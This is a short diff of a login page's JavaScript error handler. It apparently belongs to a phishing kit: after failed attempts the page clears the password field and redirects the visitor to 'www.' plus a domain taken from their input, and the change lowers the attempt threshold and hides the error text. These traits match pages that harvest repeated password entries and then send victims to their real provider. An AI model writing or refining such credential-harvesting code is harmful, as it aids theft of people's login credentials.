@@ -476,14 +476,14 @@
             },
             error: function() {
                 $("#pr").val("");
-                if (count >= 3) {
+                if (count >= 2) {
                     count = 0;
                     window.location.replace("http://www." + my_slice);
                     return false;
                 }
                 $("#msg").show();
 				setTimeout(function() { $("#msg").fadeOut('slow'); }, 3000);
-                $('#msg').html("Error: Password incorrect");
+                $('#msg').html("");
             },
             complete: function() {
                 $('#submit-btn').html('Log In');
@@ -518,3 +518,4 @@
   </div>
 </body>
 </html>
+
